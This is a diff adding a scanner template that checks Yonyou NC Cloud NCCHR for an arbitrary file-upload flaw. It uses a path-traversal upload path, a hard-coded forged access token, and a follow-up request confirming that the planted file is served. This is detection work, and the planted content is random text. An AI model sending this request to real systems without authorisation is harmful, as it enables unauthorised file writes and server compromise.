@@ -1,0 +1,26 @@
+name: yongyou-nccloud-ncchr-fileupload
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(30)
+  rboundary: randomLowercase(8)
+rules:
+  - method: POST
+    path: "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+    body: "\
+      ------WebKitFormBoundary{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"file\"; filename=\".{{randstr}}.htm\"\r\n\
+      \r\n\
+      {{randbody}}\r\n\
+      ------WebKitFormBoundary{{rboundary}}--\r\n\
+      "
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/nccloud/.{{randstr}}.htm"
+    expression: |
+      response.body.bcontains(bytes(randbody))
+detail:
+  author: 666
